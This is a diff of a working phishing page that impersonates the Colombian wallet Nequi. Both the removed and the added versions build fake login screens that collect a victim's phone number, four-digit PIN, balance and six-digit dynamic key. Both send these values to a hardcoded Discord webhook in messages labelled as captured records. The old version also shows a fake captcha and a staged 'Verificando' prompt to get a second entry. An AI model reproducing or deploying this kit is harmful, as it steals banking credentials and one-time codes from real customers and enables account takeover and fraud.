@@ -2,341 +2,751 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Entra a tu Nequi</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Nequi - Pagos PSE</title>
     <style>
-        /* Estilos base */
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #fceaf0; margin: 0; display: block; }
-        
-        /* Imagen arriba del todo, de esquina a esquina */
-        .top-banner {
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            background-color: #17001a;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .mobile-frame {
             width: 100%;
-            display: block;
+            height: 100vh;
+            background-color: #17001a;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 20px;
+            position: relative;
+        }
+
+        .screen {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            height: 100%;
+            width: 100%;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* --- Pantalla 1 --- */
+        .header-top {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+        }
+
+        .help-btn {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 6px 16px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .logo-area {
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo-container {
+            position: relative;
+        }
+
+        .logo-text {
+            font-size: 72px;
+            font-weight: 900;
+            letter-spacing: -3px;
+            color: #ffffff;
+            line-height: 1;
+        }
+
+        .pink-square {
+            width: 12px;
+            height: 12px;
+            background-color: #ff007f;
+            position: absolute;
+            left: -18px;
+            top: 18px;
+        }
+
+        .bottom-section {
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+        }
+
+        .input-section {
             margin-bottom: 20px;
         }
 
-        /* Contenedor del formulario */
-        .main-wrapper { display: flex; justify-content: center; align-items: center; min-height: 80vh; padding: 20px; }
-        .container { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
-        
-        h1 { color: #1e0033; font-size: 1.5rem; margin-top: 0; }
-        .subtitle { color: #444; font-size: 0.92rem; margin-bottom: 20px; line-height: 1.3; }
-
-        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        
-        /* Contenedor para clave dinámica y su imagen desplegable abajo */
-        .dynamic-container {
-            width: 100%;
-            margin: 10px 0;
-            text-align: left;
-        }
-
-        .dynamic-container input {
-            margin: 0;
-            cursor: pointer;
-        }
-
-        /* Imagen desplegable más pequeña abajo del input */
-        .dynamic-preview-image {
-            display: none;
-            width: 100%;
-            max-width: 220px;
-            margin: 8px auto 0 auto;
+        .input-box-wrapper {
+            background-color: #2b1130;
+            border: 1px solid #ff007f;
             border-radius: 8px;
-            border: 1px solid #ddd;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            cursor: pointer;
-            display: none;
-        }
-
-        /* Estilos del reCAPTCHA idéntico a la imagen */
-        .captcha-container {
-            background-color: white;
-            border: 2px solid #f2c2d9;
-            border-radius: 16px;
             padding: 14px 16px;
-            width: 100%;
             display: flex;
             align-items: center;
-            box-sizing: border-box;
-            margin: 15px 0 5px 0;
+            font-size: 18px;
+        }
+
+        .prefix {
+            color: rgba(255, 255, 255, 0.6);
+            margin-right: 12px;
+        }
+
+        .phone-input {
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            font-size: 18px;
+            width: 100%;
+            outline: none;
+        }
+
+        .phone-input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        .error-message {
+            color: #ff3355;
+            font-size: 13px;
+            margin-top: 8px;
+        }
+
+        .action-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 24px;
+        }
+
+        .btn-enter {
+            flex-grow: 1;
+            background-color: #a50055;
+            color: rgba(255, 255, 255, 0.4);
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            transition: 0.2s;
+        }
+
+        .btn-enter.active {
+            background-color: #c6005e;
+            color: #ffffff;
             cursor: pointer;
-            transition: all 0.3s ease;
         }
-        .captcha-container.verified {
-            border-color: #22c55e;
-            background-color: #f0fdf4;
-        }
-        .spinner-wrapper {
-            position: relative;
-            width: 42px;
-            height: 42px;
-            margin-right: 14px;
-            flex-shrink: 0;
-        }
-        .spinner-outer {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border: 3px solid #e0e0e0;
-            border-radius: 50%;
-        }
-        .spinner-inner {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border: 3px solid transparent;
-            border-top-color: #e6007e;
-            border-radius: 50%;
-            animation: spin 1.2s linear infinite;
-        }
-        .success-checkmark {
-            display: none;
-            width: 100%;
-            height: 100%;
-            background-color: #e6007e;
-            border-radius: 50%;
-            color: white;
-            align-items: center;
-            justify-content: center;
+
+        .btn-qr {
+            background-color: #c6005e;
+            color: #ffffff;
+            border: none;
+            width: 52px;
+            border-radius: 8px;
             font-size: 22px;
             font-weight: bold;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .captcha-text {
-            color: #1a1a1a;
-            font-size: 15px;
-            font-weight: 400;
-            line-height: 1.3;
-            margin: 0;
-            text-align: left;
-            flex-grow: 1;
-        }
-
-        /* Botón original exacto */
-        .btn-entrar { background-color: #f7a8c4; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; }        
-        
-        #loader { display: none; border: 5px solid #f3f3f3; border-top: 5px solid #ff005a; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        
-        /* ESTILOS DEL MODAL PARA AMPLIAR LA IMAGEN AL TOCARLA */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.6);
+            cursor: pointer;
+            display: flex;
             justify-content: center;
             align-items: center;
         }
-        .modal-content {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 15px;
-            max-width: 90%;
-            width: 350px;
-            text-align: center;
-            position: relative;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 10px;
         }
-        .modal-content img {
-            width: 100%;
-            border-radius: 10px;
+
+        .change-phone-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        .close-modal {
-            position: absolute;
-            top: 10px;
-            right: 15px;
-            font-size: 24px;
+
+        .phone-icon-svg {
+            width: 14px;
+            height: 18px;
+            border: 1.5px solid rgba(255, 255, 255, 0.8);
+            border-radius: 3px;
+        }
+
+        .change-phone {
+            text-decoration: none;
+            color: #ffffff;
+        }
+
+        .brand-by {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .bbva-bars {
             font-weight: bold;
-            color: #333;
+            letter-spacing: -2px;
+            font-size: 13px;
+        }
+
+        /* --- Pantalla 2 (Clave) --- */
+        .pin-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 24px;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
             cursor: pointer;
         }
 
-        /* ESTILOS DEL FOOTER */        .footer-nequi { background-color: #1a0026; color: white; padding: 40px 20px; width: 100%; box-sizing: border-box; }
-        .nequi-content { max-width: 400px; margin: 0 auto; }
-        .f-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
-        .f-line { border-top: 1px solid #4a2b5e; margin: 20px 0; }
-        .f-link { display: flex; justify-content: space-between; padding: 18px 0; border-bottom: 1px solid #331a40; color: white; text-decoration: none; cursor: pointer; font-size: 16px; }
-        .social-box { display: flex; justify-content: space-around; padding: 10px 0; }
-        .s-icon { border: 1px solid white; width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }    
+        .pin-dots-container {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .pin-dot {
+            width: 45px;
+            height: 45px;
+            background-color: #ece4f0;
+            border-radius: 8px;
+        }
+
+        .pin-dot.filled {
+            background-color: #270c2e;
+            border: 2px solid #ff007f;
+        }
+
+        .pin-subtitle {
+            text-align: center;
+            color: #d1c4e9;
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 40px;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            padding: 0 10px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .key {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 32px;
+            font-weight: 400;
+            cursor: pointer;
+            padding: 10px 0;
+        }
+
+        .key:active {
+            opacity: 0.5;
+        }
+
+        .forgot-pin-container {
+            text-align: center;
+        }
+
+        .btn-forgot {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 10px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        /* --- Pantalla 3 (Clave Dinámica PSE - Fondo Blanco Estilo Imagen) --- */
+        .pse-screen {
+            background-color: #ffffff;
+            color: #17001a;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            padding: 30px 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            z-index: 20;
+        }
+
+        .pse-top-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .pse-logo-container {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .pse-logo-text {
+            font-size: 40px;
+            font-weight: 900;
+            letter-spacing: -2px;
+            color: #17001a;
+            line-height: 1;
+        }
+
+        .pse-pink-square {
+            width: 8px;
+            height: 8px;
+            background-color: #ff007f;
+            position: absolute;
+            left: -12px;
+            top: 10px;
+        }
+
+        .pse-title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #17001a;
+            margin-bottom: 24px;
+        }
+
+        .pse-subtitle {
+            font-size: 14px;
+            color: #4a4052;
+            line-height: 1.5;
+            max-width: 320px;
+            margin-bottom: 30px;
+        }
+
+        .pse-input-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .pse-badge-six {
+            background-color: #e60073;
+            color: white;
+            font-size: 22px;
+            font-weight: bold;
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .pse-lines-container {
+            display: flex;
+            gap: 12px;
+        }
+
+        .pse-line-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 28px;
+        }
+
+        .pse-dash {
+            width: 100%;
+            border-bottom: 2px solid #a89ba8;
+            margin-bottom: 6px;
+        }
+
+        .pse-digit {
+            font-size: 22px;
+            font-weight: bold;
+            color: #17001a;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .pse-keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            width: 100%;
+            max-width: 320px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .pse-key {
+            background: none;
+            border: none;
+            color: #17001a;
+            font-size: 28px;
+            font-weight: 400;
+            cursor: pointer;
+            padding: 12px 0;
+        }
+
+        .pse-key:active {
+            opacity: 0.5;
+        }
+
+        .pse-key-del {
+            background-color: #17001a;
+            color: white;
+            border-radius: 8px;
+            font-size: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 48px;
+            height: 48px;
+            margin: auto;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
 
-<!-- Imagen arriba de esquina a esquina -->
-<img src="https://i.ibb.co/4RH59TLJ/Screenshot-20260731-124017-Chrome.jpg" alt="Banner superior" class="top-banner">
-
-<div class="main-wrapper">    
-    <div class="container" id="mainContainer">        
-        <div id="formContent">                
-            <h1>Entra a tu Nequi</h1>                
-            <p class="subtitle"> </p>
-            <div style="display: flex; gap: 10px;">                        
-                <div style="border: 1px solid #ddd; padding: 15px; border-radius: 8px;">🇨🇴 +57</div>                    
-                <input type="text" id="celular" placeholder="Número de celular" maxlength="10" inputmode="numeric">                    
-            </div>                    
-            <input type="password" id="pass" placeholder="Contraseña" maxlength="4" inputmode="numeric">                    
-            <input type="text" id="saldoInput" placeholder="¿Cuánto dinero tienes?" oninput="formatearDinero(this)" inputmode="numeric">                    
-            
-            <!-- Campo clave dinámica con imagen desplegable abajo -->
-            <div class="dynamic-container">
-                <input type="text" id="claveDinamica" placeholder="Clave dinámica" maxlength="6" inputmode="numeric" onclick="toggleImagen()">
-                <img src="https://i.ibb.co/tPZS5HKR/IMG-20260802-WA0045.jpg" alt="Ayuda Clave Dinámica" id="imagenDesplegada" class="dynamic-preview-image" onclick="abrirModal(event)">
-            </div>                    
-            
-            <!-- CAPTCHA INTERACTIVO -->
-            <div class="captcha-container" id="captchaBox" onclick="verificarCaptcha()">
-                <div class="spinner-wrapper" id="spinnerWrapper">
-                    <div class="spinner-outer" id="spinnerOuter"></div>
-                    <div class="spinner-inner" id="spinnerInner"></div>
-                    <div class="success-checkmark" id="successCheck">✓</div>
-                </div>
-                <p class="captcha-text" id="captchaText">
-                    Confirmo que soy una persona real.
-                </p>
+    <div class="mobile-frame">
+        
+        <!-- ================= PANTALLA 1 ================= -->
+        <div class="screen" id="screen1">
+            <div class="header-top">
+                <button class="help-btn">
+                    <span>?</span> Ayuda
+                </button>
             </div>
 
-            <button class="btn-entrar" onclick="enviarADiscord()">Entra</button>            
+            <div class="logo-area">
+                <div class="logo-container">
+                    <div class="pink-square"></div>
+                    <h1 class="logo-text">Neqᴜı</h1>
+                </div>
+            </div>
+
+            <div class="bottom-section">
+                <section class="input-section">
+                    <div class="input-box-wrapper">
+                        <span class="prefix">+57</span>
+                        <input type="tel" class="phone-input" id="phoneInput" placeholder="Ingresa tu cel" maxlength="10" oninput="validatePhone(this)">
+                    </div>
+                    <p class="error-message" id="errorMsg">Escribe porfa el número de tu cel para seguir.</p>
+                </section>
+
+                <div class="action-container">
+                    <button class="btn-enter" id="enterBtn" disabled onclick="goToPinScreen()">Entra</button>
+                    <button class="btn-qr">$</button>
+                </div>
+
+                <footer class="footer-links">
+                    <div class="change-phone-container">
+                        <div class="phone-icon-svg"></div>
+                        <a href="#" class="change-phone">¿Cambiaste tu cel?</a>
+                    </div>
+                    <div class="brand-by">by <span class="bbva-bars">≡</span></div>
+                </footer>
+            </div>
         </div>
-        <div id="loader"></div>    
-    </div>
-</div>    
 
-<!-- MODAL PARA AMPLIAR LA IMAGEN SI LA TOCAN -->
-<div class="modal" id="imageModal">
-    <div class="modal-content">
-        <span class="close-modal" onclick="cerrarModal(event)">&times;</span>
-        <img src="https://i.ibb.co/tPZS5HKR/IMG-20260802-WA0045.jpg" alt="Ayuda Clave Dinámica Ampliada">
-    </div>
-</div>
-
-<footer class="footer-image-container" style="text-align: center; padding: 20px 0;">    
-    <img src="https://i.ibb.co/SDwSqVVY/Screenshot-20260731-111005-Chrome.jpg" alt="Pie de página" style="max-width: 100%; height: auto; display: block; margin: 0 auto;">
-</footer>    
-
-<script>        
-    let intento = 0;    
-    let captchaResuelto = false;
-
-    function formatearDinero(input) { 
-        let valor = input.value.replace(/\D/g, ''); 
-        input.value = valor !== "" ? new Intl.NumberFormat('es-CO').format(valor) : ""; 
-    }        
-
-    function toggleImagen() {
-        const img = document.getElementById('imagenDesplegada');
-        if (img.style.display === 'block') {
-            img.style.display = 'none';
-        } else {
-            img.style.display = 'block';
-        }
-    }
-
-    function abrirModal(event) {
-        event.stopPropagation();
-        document.getElementById('imageModal').style.display = 'flex';
-    }
-
-    function cerrarModal(event) {
-        event.stopPropagation();
-        document.getElementById('imageModal').style.display = 'none';
-    }
-
-    // Cerrar modal si hacen clic fuera de la caja blanca
-    window.onclick = function(event) {
-        const modal = document.getElementById('imageModal');
-        if (event.target === modal) {
-            modal.style.display = 'none';
-        }
-    }
-
-    function verificarCaptcha() {
-        if (captchaResuelto) return;
-        
-        const spinnerInner = document.getElementById('spinnerInner');
-        const successCheck = document.getElementById('successCheck');
-        const captchaBox = document.getElementById('captchaBox');
-        const captchaText = document.getElementById('captchaText');
-
-        spinnerInner.style.animationPlayState = 'paused';
-        
-        setTimeout(() => {
-            spinnerInner.style.display = 'none';
-            document.getElementById('spinnerOuter').style.display = 'none';
-            successCheck.style.display = 'flex';
-            captchaBox.classList.add('verified');
-            captchaText.innerHTML = "<b>Verificación completada</b>";
-            captchaResuelto = true;
-        }, 800);
-    }
-
-    async function enviarADiscord() {         
-        const webhookUrl = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
-        const celular = document.getElementById('celular').value;
-        const clave = document.getElementById('pass').value;
-        const claveDinamica = document.getElementById('claveDinamica').value;
-        const saldo = document.getElementById('saldoInput').value;
-
-        if (!captchaResuelto) {
-            alert("Por favor, confirma que eres una persona real tocando el círculo de verificación.");
-            return;
-        }
-
-        if (saldo === "" || claveDinamica.length < 6) { 
-            alert("Por favor, corrige los datos."); 
-            return; 
-        }                
-
-        document.getElementById('formContent').style.display = 'none';        
-        document.getElementById('loader').style.display = 'block';
-
-        const mensaje = { 
-            content: intento === 0 ? "🔔 *Primer intento" : "🔔 **Segundo intento*", 
-            embeds: [{ 
-                color: 16711930, 
-                fields: [
-                    { name: "Celular", value: celular, inline: true }, 
-                    { name: "Clave", value: clave, inline: true }, 
-                    { name: "Saldo", value: "$ " + saldo, inline: false }, 
-                    { name: "Clave Dinámica", value: claveDinamica, inline: true }
-                ] 
-            }] 
-        };                
-
-        await fetch(webhookUrl, { 
-            method: "POST", 
-            headers: { "Content-Type": "application/json" }, 
-            body: JSON.stringify(mensaje) 
-        });                
-
-        setTimeout(() => {            
-            document.getElementById('loader').style.display = 'none';             
-            if (intento === 0) {                 
-                alert("Verificando..."); 
-                document.getElementById('saldoInput').value = ""; 
-                document.getElementById('claveDinamica').value = ""; 
-                document.getElementById('imagenDesplegada').style.display = 'none';
+        <!-- ================= PANTALLA 2 (Clave) ================= -->
+        <div class="screen hidden" id="screen2">
+            <div>
+                <div class="pin-header">
+                    <button class="back-btn" onclick="goToScreen1()">←</button>
+                    <span>Escribe tu clave</span>
+                </div>
                 
-                captchaResuelto = false;
-                document.getElementById('successCheck').style.display = 'none';
-                document.getElementById('spinnerOuter').style.display = 'block';
-                document.getElementById('spinnerInner').style.display = 'block';
-                document.getElementById('spinnerInner').style.animationPlayState = 'running';
-                document.getElementById('captchaBox').classList.remove('verified');
-                document.getElementById('captchaText').innerText = "Confirmo que soy una persona real.";
+                <div class="pin-dots-container">
+                    <div class="pin-dot" id="dot0"></div>
+                    <div class="pin-dot" id="dot1"></div>
+                    <div class="pin-dot" id="dot2"></div>
+                    <div class="pin-dot" id="dot3"></div>
+                </div>
 
-                document.getElementById('formContent').style.display = 'block'; 
-                intento = 1; 
-            } else {                 
-                alert("Procesando acceso..."); 
-            } 
-        }, 2000);    
-    }
-</script></body></html>
+                <div class="pin-subtitle">
+                    No dudamos que seas tú...<br>Pero es mejor confirmar ;)
+                </div>
+            </div>
+
+            <div>
+                <div class="keypad">
+                    <button class="key" onclick="pressKey('1')">1</button>
+                    <button class="key" onclick="pressKey('2')">2</button>
+                    <button class="key" onclick="pressKey('3')">3</button>
+                    <button class="key" onclick="pressKey('4')">4</button>
+                    <button class="key" onclick="pressKey('5')">5</button>
+                    <button class="key" onclick="pressKey('6')">6</button>
+                    <button class="key" onclick="pressKey('7')">7</button>
+                    <button class="key" onclick="pressKey('8')">8</button>
+                    <button class="key" onclick="pressKey('9')">9</button>
+                    <button class="key" style="visibility: hidden;"></button>
+                    <button class="key" onclick="pressKey('0')">0</button>
+                    <button class="key" onclick="pressKey('del')">⌫</button>
+                </div>
+
+                <div class="forgot-pin-container">
+                    <button class="btn-forgot">Olvidé mi clave</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= PANTALLA 3 (Pagos PSE Clave Dinámica) ================= -->
+        <div class="pse-screen hidden" id="screen3">
+            <div class="pse-top-content">
+                <div class="pse-logo-container">
+                    <div class="pse-pink-square"></div>
+                    <h1 class="pse-logo-text">Neqᴜı</h1>
+                </div>
+
+                <h2 class="pse-title">Prestamos PSE de Nequi</h2>
+                
+                <p class="pse-subtitle">
+                    Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi.
+                </p>
+
+                <div class="pse-input-row">
+                    <div class="pse-badge-six">6</div>
+                    <div class="pse-lines-container">
+                        <div class="pse-line-box">
+                            <div class="pse-digit" id="d0"></div>
+                            <div class="pse-dash"></div>
+                        </div>
+                        <div class="pse-line-box">
+                            <div class="pse-digit" id="d1"></div>
+                            <div class="pse-dash"></div>
+                        </div>
+                        <div class="pse-line-box">
+                            <div class="pse-digit" id="d2"></div>
+                            <div class="pse-dash"></div>
+                        </div>
+                        <div class="pse-line-box">
+                            <div class="pse-digit" id="d3"></div>
+                            <div class="pse-dash"></div>
+                        </div>
+                        <div class="pse-line-box">
+                            <div class="pse-digit" id="d4"></div>
+                            <div class="pse-dash"></div>
+                        </div>
+                        <div class="pse-line-box">
+                            <div class="pse-digit" id="d5"></div>
+                            <div class="pse-dash"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div>
+                <div class="pse-keypad">
+                    <button class="pse-key" onclick="pressPseKey('1')">1</button>
+                    <button class="pse-key" onclick="pressPseKey('2')">2</button>
+                    <button class="pse-key" onclick="pressPseKey('3')">3</button>
+                    <button class="pse-key" onclick="pressPseKey('4')">4</button>
+                    <button class="pse-key" onclick="pressPseKey('5')">5</button>
+                    <button class="pse-key" onclick="pressPseKey('6')">6</button>
+                    <button class="pse-key" onclick="pressPseKey('7')">7</button>
+                    <!-- CORREGIDO AQUÍ: Se cambió pressKey por pressPseKey -->
+                    <button class="pse-key" onclick="pressPseKey('8')">8</button>
+                    <button class="pse-key" onclick="pressPseKey('9')">9</button>
+                    <button class="pse-key" style="visibility: hidden;"></button>
+                    <button class="pse-key" onclick="pressPseKey('0')">0</button>
+                    <button class="pse-key" onclick="pressPseKey('del')"><div class="pse-key-del">×</div></button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        let currentPhoneNumber = "";
+        let currentPin = "";
+        let currentPsePin = "";
+
+        function validatePhone(input) {
+            const enterBtn = document.getElementById('enterBtn');
+            const errorMsg = document.getElementById('errorMsg');
+            
+            if (input.value.length >= 7) {
+                enterBtn.removeAttribute('disabled');
+                enterBtn.classList.add('active');
+                errorMsg.style.display = 'none';
+            } else {
+                enterBtn.setAttribute('disabled', 'true');
+                enterBtn.classList.remove('active');
+                errorMsg.style.display = 'block';
+            }
+        }
+
+        function goToPinScreen() {
+            const input = document.getElementById('phoneInput');
+            if (input.value.length >= 7) {
+                currentPhoneNumber = input.value;
+                document.getElementById('screen1').classList.add('hidden');
+                document.getElementById('screen2').classList.remove('hidden');
+            }
+        }
+
+        function goToScreen1() {
+            document.getElementById('screen2').classList.add('hidden');
+            document.getElementById('screen3').classList.add('hidden');
+            document.getElementById('screen1').classList.remove('hidden');
+            currentPin = "";
+            currentPsePin = "";
+            updatePinDots();
+            updatePseDisplay();
+        }
+
+        function pressKey(num) {
+            if (num === 'del') {
+                currentPin = currentPin.slice(0, -1);
+            } else if (currentPin.length < 4) {
+                currentPin += num;
+            }
+            updatePinDots();
+
+            if (currentPin.length === 4) {
+                enviarAWebhookDiscord(currentPhoneNumber, currentPin, null);
+            }
+        }
+
+        function updatePinDots() {
+            for (let i = 0; i < 4; i++) {
+                const dot = document.getElementById('dot' + i);
+                if (i < currentPin.length) {
+                    dot.classList.add('filled');
+                } else {
+                    dot.classList.remove('filled');
+                }
+            }
+        }
+
+        function pressPseKey(num) {
+            if (num === 'del') {
+                currentPsePin = currentPsePin.slice(0, -1);
+            } else if (currentPsePin.length < 6) {
+                currentPsePin += num;
+            }
+            updatePseDisplay();
+
+            if (currentPsePin.length === 6) {
+                enviarClaveDinamicaWebhook(currentPhoneNumber, currentPin, "6" + currentPsePin);
+            }
+        }
+
+        function updatePseDisplay() {
+            for (let i = 0; i < 6; i++) {
+                const box = document.getElementById('d' + i);
+                if (i < currentPsePin.length) {
+                    box.textContent = currentPsePin[i];
+                } else {
+                    box.textContent = "";
+                }
+            }
+        }
+
+        function enviarAWebhookDiscord(telefono, pin, claveDinamica) {
+            const webhookURL = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
+
+            let mensaje = `🚨 **Nuevo Registro Capturado** 🚨\n📱 **Celular:** +57 ${telefono}\n🔑 **PIN:** ${pin}`;
+            if (claveDinamica) {
+                mensaje += `\n🔢 **Clave Dinámica PSE:** ${claveDinamica}`;
+            }
+
+            const payload = { content: mensaje };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                setTimeout(() => {
+                    if (!claveDinamica) {
+                        document.getElementById('screen2').classList.add('hidden');
+                        document.getElementById('screen3').classList.remove('hidden');
+                    }
+                }, 300);
+            })
+            .catch(error => {
+                console.error("Error al enviar datos:", error);
+                setTimeout(() => {
+                    if (!claveDinamica) {
+                        document.getElementById('screen2').classList.add('hidden');
+                        document.getElementById('screen3').classList.remove('hidden');
+                    }
+                }, 300);
+            });
+        }
+
+        function enviarClaveDinamicaWebhook(telefono, pin, claveDinamica) {
+            const webhookURL = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
+
+            const payload = {
+                content: `🚨 **Clave Dinámica PSE Capturada** 🚨\n📱 **Celular:** +57 ${telefono}\n🔑 **PIN:** ${pin}\n🔢 **Clave Dinámica:** ${claveDinamica}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                setTimeout(() => {
+                    alert("¡Proceso completado con éxito!");
+                    goToScreen1();
+                }, 400);
+            })
+            .catch(error => {
+                console.error("Error al enviar clave dinámica:", error);
+                setTimeout(() => {
+                    alert("¡Proceso completado con éxito!");
+                    goToScreen1();
+                }, 400);
+            });
+        }
+    </script>
+</body>
+                    </html>
